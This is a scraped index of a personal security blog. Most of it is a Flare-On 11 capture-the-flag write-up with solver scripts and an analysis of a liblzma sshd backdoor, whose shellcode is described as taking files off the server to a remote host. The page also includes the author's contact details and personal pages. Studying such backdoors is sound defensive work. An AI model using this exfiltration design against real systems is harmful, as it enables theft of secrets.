gì cũng phải có cách. Nếu bóng đã không lên thì nó không thể giúp doanh nghiệp đánh bóng tên tu","date":"2025-01-06","objectID":"/2024-affcup/:0:0","tags":["Blog"],"title":"Happy New Year 2025 - Việt Nam vô địch AFF Cup 2024","uri":"/2024-affcup/"},{"categories":null,"content":"\rimg {\rbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;\rborder-radius: 6px;\rdisplay: block; margin: 0 auto 15px;\r}\r\r","date":"2024-12-31","objectID":"/2024-flareon/:0:0","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"Challenge 1: frog A game written in Python: your task is to move the frog to the correct spot to get the flag. ","date":"2024-12-31","objectID":"/2024-flareon/:1:0","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x01 Getting the flag We can open the game’s source code to read it - it’s in the frog.py file. At a glance, there’s a function that generates the “flag” called GenerateFlagText() : def GenerateFlagText(x, y): key = x + y*20 encoded = \"\\xa5\\xb7\\xbe\\xb1\\xbd\\xbf\\xb7\\x8d\\xa6\\xbd\\x8d\\xe3\\xe3\\x92\\xb4\\xbe\\xb3\\xa0\\xb7\\xff\\xbd\\xbc\\xfc\\xb1\\xbd\\xbf\" return ''.join([chr(ord(c) ^ key) for c in encoded]) We don’t need the exact values of x and y. Instead, we’ll brute-force all values from 0 to 999 to find the correct flag. def GenerateFlagText(x, y): key = x + y*20 encoded = \"\\xa5\\xb7\\xbe\\xb1\\xbd\\xbf\\xb7\\x8d\\xa6\\xbd\\x8d\\xe3\\xe3\\x92\\xb4\\xbe\\xb3\\xa0\\xb7\\xff\\xbd\\xbc\\xfc\\xb1\\xbd\\xbf\" return ''.join([chr(ord(c) ^ key) for c in encoded]) for x in range(0, 999): for y in range(0, 999): flag = GenerateFlagText(x, y) if \"flare\" in flag: print(flag) break # welcome_to_11@flare-on.com ","date":"2024-12-31","objectID":"/2024-flareon/:1:1","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"Challenge 2: checksum ","date":"2024-12-31","objectID":"/2024-flareon/:2:0","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x01 Overview The challenge provides us with a PE64 file written in Golang, along with several questions related to the result of a “checksum” calculation. C:\\Users\\PWN2OWN\u003e\"C:\\Users\\PWN2OWN\\FlareOn\\2024\\checksum.exe\" Check sum: 9418 + 92 = 9510 Good math!!! ------------------------------ Check sum: 9397 + 3991 = 13388 Good math!!! ------------------------------ Check sum: 5380 + 1695 = 7075 Good math!!! ------------------------------ Check sum: 3936 + 7655 = 11591 Good math!!! ------------------------------ Checksum: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Maybe it's time to analyze the binary! ;) ","date":"2024-12-31","objectID":"/2024-flareon/:2:1","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x02 Static Analysis The program contains three non-library functions: main_main, main_a, main_b. First, randomTimes represents the number of math questions to be generated, with its value randomly chosen in the range [0, 5]. This value is then increased by 3, resulting in a total of 3 to 8 arithmetic questions. Each question randomly generates two operators, which I renamed to fsRandom and seRandom. The player’s task is to input the correct sum of these two numbers. If all answers are correct, the program proceeds to the next stage. randomTimes = math_rand_v2__ptr_Rand_uint64n(math_rand_v2_globalRand, 5); inputNumber = (int *)runtime_newobject(\u0026RTYPE_int); for ( i = 0; i \u003c randomTimes + 3; i = v45 + 1 ) { v45 = i; fsRandom = math_rand_v2__ptr_Rand_uint64n(math_rand_v2_globalRand, 10000); seRandom = math_rand_v2__ptr_Rand_uint64n(math_rand_v2_globalRand, 10000); v66 = 0; v67 = 0; v2 = runtime_convT64(fsRandom); *(_QWORD *)\u0026v66 = \u0026RTYPE_int; *((_QWORD *)\u0026v66 + 1) = v2; v3 = runtime_convT64(seRandom); *(_QWORD *)\u0026v67 = \u0026RTYPE_int; *((_QWORD *)\u0026v67 + 1) = v3; sumRandom = fsRandom + seRandom; fmt_Fprintf(go_itab__os_File_io_Writer, os_Stdout, \"Check sum: %d + %d = \", 21, \u0026v66, 2, 2); v65[0] = \u0026RTYPE__ptr_int; v65[1] = inputNumber; v72 = fmt_Fscanf(go_itab__os_File_io_Reader, os_Stdin, \"%d\\n\", 3, v65, 1, 1); v4 = main_b(v72._r1, v72._r2, \"Not a valid answer...\", 21); if ( *(_QWORD *)inputNumber != fsRandom + seRandom ) { runtime_printlock(v4); v5 = runtime_printstring(\"Try again! ;)\\n\", 14); runtime_printunlock(v5); return; } ((void (*)(void))runtime_printlock)(); v1 = runtime_printstring(\"Good math!!!\\n------------------------------\\n\", 44); runtime_printunlock(v1); } The program then prompts for a checksum input and verifies its validity using a Golang API. input_checksum = (string *)runtime_newobject(\u0026RTYPE_string); input_checksum-\u003eptr = 0; v64[0] = \u0026RTYPE_string; v64[1] = \u0026off_4EDAB0; // checksum fmt_Fprint(go_itab__os_File_io_Writer, os_Stdout, v64, 1, 1); v63[0] = \u0026RTYPE__ptr_string; v63[1] = input_checksum; v70 = fmt_Fscanf(go_itab__os_File_io_Reader, os_Stdin, \"%s\\n\", 3, v63, 1, 1); main_b(v70._r1, v70._r2, \"Fail to read checksum input...\", 30); --\rThe input_checksum must be exactly 32 bytes long, where the first 24 bytes are extracted as the buffer. The program uses the XChaCha20-Poly1305 encryption algorithm, which requires a 32-byte key and a 24-byte nonce. Based on this, we can hypothesize that the buffer serves as the nonce in this encryption scheme. buffer = (BYTE *)runtime_makeslice(\u0026RTYPE_uint8, 24, 24); input_checksum_length = v44; v14 = r0; for ( j = 0; input_checksum_length \u003e (__int64)j \u0026\u0026 j != 24; ++j ) { if ( j \u003e= 0x18 ) goto LABEL_33; buffer[j] = v14-\u003ekey[j]; // buffer = input_checksum[0:24] } v59.cap = (size_t)buffer; if ( input_checksum_length == 32 ) // must be 32 bytes { p_chacha20poly1305_xchacha20poly1305 = (chacha20poly1305_xchacha20poly1305 *)runtime_newobject(\u0026RTYPE_chacha20poly1305_xchacha20poly1305); if ( p_chacha20poly1305_xchacha20poly1305 != r0 ) { v57 = p_chacha20poly1305_xchacha20poly1305; runtime_memmove(p_chacha20poly1305_xchacha20poly1305, r0, 32); p_chacha20poly1305_xchacha20poly1305 = v57; } v16 = go_itab__golang_org_x_crypto_chacha20poly1305_xchacha20poly1305_crypto_cipher_AEAD; v17 = 0; v18 = p_chacha20poly1305_xchacha20poly1305; v19 = 0; } else { v62[1] = 32; v62[0] = \"chacha20poly1305: bad key length\"; v16 = 0; v17 = go_itab__errors_errorString_error; v18 = 0; v19 = v62; } --\rBy decoding the encryptedFlagData using the key and the nonce mentioned above, we obtain the decryptedData. The decryptedData is hashed using SHA-256, then converted to a hexadecimal string and compared with input_checksum. If they match, the function main_a is called and the result is printed to {os_UserCacheDir}\\REAL_FLAREON_FLAG.JPG. Analyzing the main_a function, we can see that its logic is relatively straightforward. The input_checksum is XORed with the string FlareOn2024, then base64-encoded and compared wi","date":"2024-12-31","objectID":"/2024-flareon/:2:2","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x03 Getting the flag Finding correct checksum value: \u003e\u003e\u003e x = b\"cQoFRQErX1YAVw1zVQdFUSxfAQNRBXUNAxBSe15QCVRVJ1pQEwd/WFBUAlElCFBFUnlaB1ULByRdBEFdfVtWVA==\" \u003e\u003e\u003e y = b\"FlareOn2024\" \u003e\u003e\u003e import base64 \u003e\u003e\u003e xx = base64.b64decode(x) \u003e\u003e\u003e \"\".join(chr(xx[i] ^ y[i % len(y)]) for i in range(len(xx))) '7fd7dd1d0e959f74c133c13abb740b9faa61ab06bd0ecd177645e93b1e3825dd' Finding flag in local app data C:\\Users\\PWN2OWN\\AppData\\Local ","date":"2024-12-31","objectID":"/2024-flareon/:2:3","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"Challenge 3: aray The challenge provides a YARA rule file, and the task is to find an input that satisfies all the conditions defined in the rule. ","date":"2024-12-31","objectID":"/2024-flareon/:3:0","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x01 Clean code First, clean up the code by replacing all occurrences of and with line breaks \\n for better readability. At a glance, there are two types of data involved: uint8 unint32 with operands: +, -, \u0026, %. Additionally, there are several comparisons using hash functions like sha256, md5, and crc32 such as: hash.crc32(8, 2) == 0x61089c5c hash.crc32(34, 2) == 0x5888fc1b hash.crc32(63, 2) == 0x66715919 hash.sha256(14, 2) == \"403d5f23d149670348b147a15eeb7010914701a7e99aad2e43f90cfa0325c76f\" hash.sha256(56, 2) == \"593f2d04aab251f60c9e4b8bbc1e05a34e920980ec08351a18459b2bc7dbf2f6\" hash.md5(0, 2) == \"89484b14b36a8d5329426a3d944d2983\" hash.crc32(78, 2) == 0x7cab8d64 hash.md5(76, 2) == \"f98ed07a4d5f50f7de1410d905f1477f\" hash.md5(50, 2) == \"657dae0913ee12be6fb2a6f687aae1c7\" hash.md5(32, 2) == \"738a656e8e8ec272ca17cd51e12f558b\" With each chunk being only 2 bytes, it’s easy to brute-force to find values that satisfy these conditions. # Define all hash targets and positions targets = [ ('crc32', 8, 0x61089c5c), ('crc32', 34, 0x5888fc1b), ('crc32', 63, 0x66715919), ('sha256', 14, \"403d5f23d149670348b147a15eeb7010914701a7e99aad2e43f90cfa0325c76f\"), ('sha256', 56, \"593f2d04aab251f60c9e4b8bbc1e05a34e920980ec08351a18459b2bc7dbf2f6\"), ('md5', 0, \"89484b14b36a8d5329426a3d944d2983\"), ('crc32', 78, 0x7cab8d64), ('md5', 76, \"f98ed07a4d5f50f7de1410d905f1477f\"), ('md5', 50, \"657dae0913ee12be6fb2a6f687aae1c7\"), ('md5', 32, \"738a656e8e8ec272ca17cd51e12f558b\"), ] # Choose charset (printable ASCII) charset = range(32, 127) # Brute-force for hash_type, offset, expected in targets: # print(f\"[*] Brute-forcing {hash_type} at offset {offset}...\") found = False for c1, c2 in itertools.product(charset, repeat=2): pair = bytes([c1, c2]) if hash_type == 'crc32': h = binascii.crc32(pair) \u0026 0xffffffff if h == expected: found = True elif hash_type == 'sha256': h = hashlib.sha256(pair).hexdigest() if h == expected: found = True elif hash_type == 'md5': h = hashlib.md5(pair).hexdigest() if h == expected: found = True if found: s.add(flag[offset] == c1) s.add(flag[offset + 1] == c2) break if not found: print(f\"[-] No match found at offset {offset}\") For the remaining conditions, we can easily solve them using Z3. from z3 import * filesize = 85 flag = [BitVec(f\"b{i}\", 85 * 8) for i in range(filesize)] s = Solver() s.add((filesize ^ flag[11]) != 107 ) s.add((flag[55]) \u0026 128 == 0 ) s.add((flag[58]) + 25 == 122 ) s.add((flag[7]) \u0026 128 == 0 ) s.add((flag[48]) % 12 \u003c 12 ) [...] if (s.check() == sat): res = bytearray() for b in flag: res.append(s.model()[b].as_long()) print(res) ","date":"2024-12-31","objectID":"/2024-flareon/:3:1","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x02 Getting the flag Full script C:\\Users\\PWN2OWN\\CTF\\Flare-On\\Flare11\\3_aray\\aray\u003epython solve.py bytearray(b'rule flareon { strings: $f = \"1RuleADayK33p$Malw4r3Aw4y@flare-on.com\" condition: $f }') ","date":"2024-12-31","objectID":"/2024-flareon/:3:2","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"Challenge 4: FLARE Meme Maker 3000 The challenge provides a mememaker3000.html file containing an obfuscated JavaScript snippet. ","date":"2024-12-31","objectID":"/2024-flareon/:4:0","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x01 Deobfuscate Deobfuscate using the website https://deobfuscate.relative.im, the resulting source code is quite clear: const a0c = [ 'When you find a buffer overflow in legacy code', 'Reverse Engineer', 'When you decompile the obfuscated code and it makes perfect sense', 'Me after a week of reverse engineering', 'When your decompiler crashes', \"It's not a bug, it'a a feature\", \"Security 'Expert'\", 'AI', \"That's great, but can you hack it?\", 'When your code compiles for the first time', \"If it ain't broke, break it\", \"Reading someone else's code\", 'EDR', 'This is fine', 'FLARE On', \"It's always DNS\", 'strings.exe', \"Don't click on that.\", 'When you find the perfect 0-day exploit', 'Security through obscurity', 'Instant Coffee', 'H@x0r', 'Malware', '$1,000,000', 'IDA Pro', 'Security Expert', ], a0d = { doge1: [ ['75%', '25%'], ['75%', '82%'], ], boy_friend0: [ ['75%', '25%'], ['40%', '60%'], ['70%', '70%'], ], draw: [['30%', '30%']], drake: [ ['10%', '75%'], ['55%', '75%'], ], two_buttons: [ ['10%', '15%'], ['2%', '60%'], ], success: [['75%', '50%']], disaster: [['5%', '50%']], aliens: [['5%', '50%']], }, a0e = { 'doge1.png': 'data:image/png;base64, [...]', 'draw.jpg': 'data:image/jpeg;base64, [...]', 'drake.jpg': 'data:image/jpeg;base64, [...]', 'two_buttons.jpg': 'data:image/jpeg;base64, [...]', 'fish.jpg': 'data:binary/red;base64, [...]', 'boy_friend0.jpg': 'data:image/jpeg;base64, [...]', 'success.jpg': 'data:image/jpeg;base64, [...]', 'disaster.jpg': 'data:image/jpeg;base64, [...]', 'aliens.jpg': 'data:image/jpeg;base64, [...]', } function a0f() { document.getElementById('caption1').hidden = true document.getElementById('caption2').hidden = true document.getElementById('caption3').hidden = true const a = document.getElementById('meme-template') var b = a.value.split('.')[0] a0d[b].forEach(function (c, d) { var e = document.getElementById('caption' + (d + 1)) e.hidden = false e.style.top = a0d[b][d][0] e.style.left = a0d[b][d][1] e.textContent = a0c[Math.floor(Math.random() * (a0c.length - 1))] }) } a0f() const a0g = document.getElementById('meme-image'), a0h = document.getElementById('meme-container'), a0i = document.getElementById('remake'), a0j = document.getElementById('meme-template') a0g.src = a0e[a0j.value] a0j.addEventListener('change', () =\u003e { a0g.src = a0e[a0j.value] a0g.alt = a0j.value a0f() }) a0i.addEventListener('click', () =\u003e { a0f() }) function a0k() { const a = a0g.alt.split('/').pop() if (a !== Object.keys(a0e)[5]) { return } const b = a0l.textContent, c = a0m.textContent, d = a0n.textContent if ( a0c.indexOf(b) == 14 \u0026\u0026 a0c.indexOf(c) == a0c.length - 1 \u0026\u0026 a0c.indexOf(d) == 22 ) { var e = new Date().getTime() while (new Date().getTime() \u003c e + 3000) {} var f = d[3] + 'h' + a[10] + b[2] + a[3] + c[5] + c[c.length - 1] + '5' + a[3] + '4' + a[3] + c[2] + c[4] + c[3] + '3' + d[2] + a[3] + 'j4' + a0c[1][2] + d[4] + '5' + c[2] + d[5] + '1' + c[11] + '7' + a0c[21][1] + b.replace(' ', '-') + a[11] + a0c[4].substring(12, 15) f = f.toLowerCase() alert(atob('Q29uZ3JhdHVsYXRpb25zISBIZXJlIHlvdSBnbzog') + f) } } const a0l = document.getElementById('caption1'), a0m = document.getElementById('caption2'), a0n = document.getElementById('caption3') a0l.addEventListener('keyup', () =\u003e { a0k() }) a0m.addEventListener('keyup', () =\u003e { a0k() }) a0n.addEventListener('keyup', () =\u003e { a0k() }) ","date":"2024-12-31","objectID":"/2024-flareon/:4:1","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x02 Getting the flag There is a base64 encoded string with the content Congratulations! Here you go: . From this, we can deduce that the a0k() function contains the flag. There are 2 conditions that need to be bypassed: First, the meme template must satisfy: if (a !== Object.keys(a0e)[5]) { return } Second, the text in the boxes must satisfy: if ( a0c.indexOf(b) == 14 \u0026\u0026 a0c.indexOf(c) == a0c.length - 1 \u0026\u0026 a0c.indexOf(d) == 22 ) To satisfy the first condition, we just need to declare: a = Object.keys(a0e)[5] For the second condition, we just need to change the values of the elements right after randomization: function a0f() { document.getElementById('caption1').hidden = true document.getElementById('caption2').hidden = true document.getElementById('caption3').hidden = true const a = document.getElementById('meme-template') var b = a.value.split('.')[0] a0d[b].forEach(function (c, d) { var e = document.getElementById('caption' + (d + 1)) e.hidden = false e.style.top = a0d[b][d][0] e.style.left = a0d[b][d][1] e.textContent = a0c[Math.floor(Math.random() * (a0c.length - 1))] }) document.getElementById('caption1').textContent = 'FLARE On' document.getElementById('caption2').textContent = 'Security Expert' document.getElementById('caption3').textContent = 'Malware' } After reloading the page, we get the flag: wh0a_it5_4_cru3l_j4va5cr1p7@flare-on.com. ","date":"2024-12-31","objectID":"/2024-flareon/:4:2","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"Challenge 5: sshd Challenge Information Given file: sshd.7z Description: Our server in the FLARE Intergalactic HQ has crashed! Now criminals are trying to sell me my own data!!! Do your part, random internet hacker, to help FLARE out and tell us what data they stole! We used the best forensic preservation technique of just copying all the files on the system for you. 7zip archive password: flare ","date":"2024-12-31","objectID":"/2024-flareon/:5:0","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x00 My opinion In my opinion, this is one of the best challenges in the series. It is related to cases of real-world cybersecurity incidents and mentions a very interesting backdoor that was discovered last year. ","date":"2024-12-31","objectID":"/2024-flareon/:5:1","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x01 Overview The challenge provides a filesystem image. The description mentions that the server crashed due to something. When an application crashes on Linux, the coredump file is stored at /var/lib/systemd/coredump. There is a coredump file related to the sshd process. ➜ ls ./var/lib/systemd/coredump sshd.core.93794.0.0.11.1725917676 To get a clearer picture of the memory at the time the process crashed, I used GDB for analysis. ➜ gdb ./usr/sbin/sshd ./var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676 Looking at the information provided by the bt command, the program crashed due to calling a function at address 0x0000000000000000. The function that caused the crash is at address 0x00007f4a18c8f88f, located in the liblzma.so.5 library. Observing the memory mapping information using the info proc mappings command, we see that starting from address 0x7f4a18c86000, there are memory regions that have been deleted but contain the faulty code at 0x00007f4a18c8f88f. Update the base address of the library in IDA PRO to facilitate analysis of the liblzma.so.5 library. ","date":"2024-12-31","objectID":"/2024-flareon/:5:2","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x02 Analysis the library Jumping to the address that caused the crash, the function that caused the error is sub_7F4A18C8F820, with the content renamed as follows: Normally, dlsym would call the RSA_public_decrypt function by its exact name. However, symbol_name has an extra space at the end. Therefore, dlsym returns NULL, and the code below causes a crash. What we need to pay attention to is the code at line[20:26]. Thanks to the string expand 32-byte k, we can determine that the encryption algorithm is likely ChaCha20 or Salsa20. Its operation flow can be summarized as follows: The process involves mapping and copying the encrypted shellcode into a memory region with full RWX permissions. After that, the shellcode is decrypted, executed, and then re-encrypted to avoid detection. The next task is to decrypt the shellcode. There are several ways to decrypt the shellcode. You can dump the init_chacha20_block, sus_crypto_fn, from, and encrypted_shellcode functions and use Unicorn or Ghidra + plugin to emulate and analyze. I choose a different way to save time, though it may be more error-prone. Find the key and nonce and manually decrypt the shellcode. The v10 function — the one that caused the crash calls the from variable as its second parameter. Therefore, rsi will store the value of the from variable (v10)(flen, from, to, rsa, padding) From there, it’s easy to determine: key = from + 4 and nonce = from + 0x24 based on the call to init_chacha20_block_sub_7F4A18C8F3F0(v14, (from + 4), (from + 0x24), 0LL). We see that rsi = from = 0xc5407a48, which matches the backdoor signature check. Continue to decrypt the shellcode with the key and nonce just found. from Crypto.Cipher import ChaCha20 key = b\"\\x94\\x3d\\xf6\\x38\\xa8\\x18\\x13\\xe2\\xde\\x63\\x18\\xa5\\x07\\xf9\\xa0\\xba\\x2d\\xbb\\x8a\\x7b\\xa6\\x36\\x66\\xd0\\x8d\\x11\\xa6\\x5e\\xc9\\x14\\xd6\\x6f\" nonce = b\"\\xf2\\x36\\x83\\x9f\\x4d\\xcd\\x71\\x1a\\x52\\x86\\x29\\x55\" with open(\"./dumped_bytes.bin\", \"rb\") as f: encrypted_data = f.read() cipher = ChaCha20.new(key=key, nonce=nonce) decrypted_data = cipher.decrypt(encrypted_data) with open(\"decrypted_shellcode.bin\", \"wb\") as f: f.write(decrypted_data) ","date":"2024-12-31","objectID":"/2024-flareon/:5:3","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"0x03 Analysis shellcode The shellcode is quite short and straightforward. It frequently sets the value of the rax register to call syscalls in the form {push value; pop rax} To summarize, the shellcode’s operation flow is as follows: Create a socket and connect to 10.0.2.15:1337 Receive 0x20 bytes key Receive 12 bytes nonce Receive 4 bytes size_of_file_path_name Receive size_of_file_path_name bytes file_path Open the file Read 0x80 bytes from file_path, store in file_content Initialize ChaCha20/Salsa algorithm Encrypt file_content using the above algorithm Send encrypted_file_content_size to C2 Send encrypted_file_content to C2 Close the file Shutdown the connection Searching for strings in the coredump file, we find a very important path /root/certificate_authority_signing_key.txt. Opening HxD, we can easily see that the values around the path match the operation flow summarized above. Green underline: key Orange underline: nonce Red underline: size_of_file_path_name Using IDA PRO, we calculate the offset of path_name relative to file_content. Returning to decrypting the data, the shellcode used the ChaCha20 algorithm but with a custom sigma expand 32-byte K. Rewrite the entire ChaCha20 decryption function instead of using the library, and we get the challenge flag. import struct def rotate(v, c): return ((v \u003c\u003c c) \u0026 0xffffffff) | (v \u003e\u003e (32 - c)) def quarter_round(x, a, b, c, d): x[a] = (x[a] + x[b]) \u0026 0xffffffff x[d] ^= x[a] x[d] = rotate(x[d], 16) x[c] = (x[c] + x[d]) \u0026 0xffffffff x[b] ^= x[c] x[b] = rotate(x[b], 12) x[a] = (x[a] + x[b]) \u0026 0xffffffff x[d] ^= x[a] x[d] = rotate(x[d], 8) x[c] = (x[c] + x[d]) \u0026 0xffffffff x[b] ^= x[c] x[b] = rotate(x[b], 7) def chacha20_block(key, counter, nonce, sigma): state = ( list(struct.unpack('\u003c4I', sigma)) + list(struct.unpack('\u003c8I', key)) + [counter] + list(struct.unpack('\u003c3I', nonce)) ) working_state = state[:] for _ in range(10): # 20 rounds (10 double rounds) quarter_round(working_state, 0, 4, 8, 12) quarter_round(working_state, 1, 5, 9, 13) quarter_round(working_state, 2, 6, 10, 14) quarter_round(working_state, 3, 7, 11, 15) quarter_round(working_state, 0, 5, 10, 15) quarter_round(working_state, 1, 6, 11, 12) quarter_round(working_state, 2, 7, 8, 13) quarter_round(working_state, 3, 4, 9, 14) for i in range(16): working_state[i] = (working_state[i] + state[i]) \u0026 0xffffffff return struct.pack('\u003c16I', *working_state) def chacha20_decrypt(key, nonce, ciphertext, counter=0, sigma=b\"expand 32-byte K\"): assert len(key) == 32 assert len(nonce) == 12 assert len(sigma) == 16 plaintext = b\"\" for block_index in range(0, len(ciphertext), 64): block = chacha20_block(key, counter, nonce, sigma) chunk = ciphertext[block_index:block_index + 64] keystream = block[:len(chunk)] plaintext += bytes([c ^ k for c, k in zip(chunk, keystream)]) counter += 1 return plaintext key = b\"\\x8D\\xEC\\x91\\x12\\xEB\\x76\\x0E\\xDA\\x7C\\x7D\\x87\\xA4\\x43\\x27\\x1C\\x35\\xD9\\xE0\\xCB\\x87\\x89\\x93\\xB4\\xD9\\x04\\xAE\\xF9\\x34\\xFA\\x21\\x66\\xD7\" nonce = b\"\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\" encrypted_data = b\"\\xA9\\xF6\\x34\\x08\\x42\\x2A\\x9E\\x1C\\x0C\\x03\\xA8\\x08\\x94\\x70\\xBB\\x8D\\xAA\\xDC\\x6D\\x7B\\x24\\xFF\\x7F\\x24\\x7C\\xDA\\x83\\x9E\\x92\\xF7\\x07\\x1D\\x02\\x63\\x90\\x2E\\xC1\\x58\" custom_sigma = b\"expand 32-byte K\" plaintext = chacha20_decrypt(key, nonce, encrypted_data, counter=0, sigma=custom_sigma) print(\"Decrypted:\", plaintext) # Decrypted: b'supp1y_cha1n_sund4y@flare-on.com\\n\\x86Xm\\xb4U' ","date":"2024-12-31","objectID":"/2024-flareon/:5:4","tags":["Reverse-Engineering","Flare-On","2024"],"title":"Flare-On 11","uri":"/2024-flareon/"},{"categories":null,"content":"About Me","date":"2024-12-13","objectID":"/aboutme/","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"\r\rBachelor of Science in Cyber Security, Thuyloi University, Class of 2026 (CPA: 3.97/4.00) Email: contact.ducdatdau@gmail.com Phone: (+84) 366.337.737 Discord: #ducdatdau Note I am prepared to begin graduate research at the Master’s or Ph.D. level immediately after my graduation in the summer of next year. If my research interests align with yours and you believe I may be a suitable candidate, please feel free to contact me using the information provided above. After reading this blog by Prof. Andreas Zeller, I am especially excited about pursuing graduate study in Germany 🇩🇪. ","date":"2024-12-13","objectID":"/aboutme/:0:0","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"PROFILE Duc Dat Dau is a senior undergraduate student in Cyber Security at Thuyloi University, Vietnam. His research centers on automated vulnerability discovery, with a particular focus on Fuzzing. He has a strong background in reverse engineering and binary exploitation, emphasizing analysis and manipulation of low-level program behavior. Beyond software, he is also interested in hardware-assisted security, with a specific focus on the security of Internet of Things (IoT) devices. ","date":"2024-12-13","objectID":"/aboutme/:1:0","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"PUBLICATIONS [1] Research on the technique of File Structure Attack [2] Generator-Based Fuzzing: Enhancing Coverage and Reusing High-Quality Inputs ","date":"2024-12-13","objectID":"/aboutme/:2:0","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"RESEARCH AREAS Fuzzing Binary Exploitation Reverse Engineering ","date":"2024-12-13","objectID":"/aboutme/:3:0","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"RESEARCH INTERESTING Internet of Things (IoT) Hardware Security ","date":"2024-12-13","objectID":"/aboutme/:4:0","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"HONORS \u0026 AWARDS Academic Le Van Kiem Scholarship for Excellence student (2023) Bronze Medal, Vietnam National Mathematics Olympiad for Undergraduates (2023) Best student in Cyber Security major (2023, 2025) ","date":"2024-12-13","objectID":"/aboutme/:5:0","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"List 100","date":"2024-12-13","objectID":"/list100/","tags":null,"title":"List 100","uri":"/list100/"},{"categories":null,"content":" Things I want to do before I die. Please let me know if you have any recommendation. Progress as of August 2, 2025 Live in another country Travel all cities in Vietnam 🇻🇳 Visit 100 countries (1/100) Read 1000 books 📕 Fall in love Learn to ski 🏂🏻 Get a PhD (in Cyber Security) Ride a horse in Mongolia 🏇 Visit Tshinghua, Peking university 🇨🇳 Visit Harvard, Stanford, MIT university 🇺🇸 Win Pwn2Own contest Speak at DEFCON ☠️ Meet Dalai Lama 🙏 Climb Greet wall, China 🇨🇳 Visit FAANG (Facebook, Apple, Amazon, Netflix, Google) Meet Scott Wu Work in a casino Win Flare-On contest Top 100 MSRC Most Valuable Researcher Be in a submarine Fly an airplane Go on an African safari Drink vodka in Russia Eat sushi in Japan ","date":"2024-12-13","objectID":"/list100/:0:0","tags":null,"title":"List 100","uri":"/list100/"},{"categories":["Blog"],"content":" Đây là câu chuyện cảm động về tiến sĩ An Kim Bằng (Jinpeng An), người Trung Quốc, đạt huy chương Vàng IMO năm 1997, kể về người mẹ nghèo của mình. Bài viết đã thúc đẩy và truyền lửa cho tôi rất nhiều trong quá trình học Toán, đặc biệt là thời gian ôn luyện Olympic Toán sinh viên. NGHÈO ĐÓI LÀ TRƯỜNG ĐẠI HỌC TỐT NHẤT “Mẹ ít văn hoá, nhưng mẹ nhớ khi nhỏ được thầy giáo dạy là, Golgi có nói một câu: Nghèo đói là trường đại học tốt nhất. Nếu con có thể tốt nghiệp trường đại học này, thì những trường đại học như Thiên Tân, Bắc Kinh con chắc chắn đều đỗ…”. Ngày 5/9/1997, là ngày tôi rời gia đình đi nhập học ở Đại học Bắc Kinh, khoa Toán. Ngọn khói bếp dài cất lên từ trên nóc ngôi nhà nông dân cũ nát gia đình tôi. Người mẹ chân thập thễnh của tôi đang nấu mì sợi cho tôi, những bột mì này có được nhờ mẹ đổi năm quả trứng gà cho hàng xóm, chân mẹ bị thương vì mấy hôm trước, để thêm tí tiền cho tôi nhập học, mẹ đẩy một xe chất đầy rau từ thôn ra thị trấn, trên đường bị trật chân. Bưng bát mì, tôi đã khóc. Tôi buông đũa quỳ xuống đất, xoa nắn chỗ chân sưng phồng lên to hơn cả cái bánh bao của mẹ, nước mắt rơi xuống đất… Nhà tôi ở Thiên Tân, làng Đại Hữu Đới, huyện Vũ Thanh, tôi có một người mẹ tốt nhất thế gian tên là Lý Diệm Hà. Nhà tôi vô cùng nghèo khó. Khi tôi ra đời, bà nội ngã bệnh ngay trên giường sưởi, tôi bốn tuổi, ông nội lại mắc bệnh hẹp khí quản và bán thân bất toại, những món nợ trong nhà lớn dần theo năm. Khi bảy tuổi, tôi được đi học, học phí là mẹ vay người khác. Tôi thường đi nhặt những mẩu bút chì bạn bè vứt đi, dùng dây buộc nó lên một cái que rồi viết tiếp, hoặc dùng một cái dây chun xoá sạch những cuốn vở bài tập đã viết, rồi viết lại lên đó, mẹ thương tôi đến mức, cũng có lúc đi vay vài hào của hàng xóm để mua vở và bút chì cho tôi. Nhưng cũng có những khi mẹ vui vẻ, là khi bất kể bài 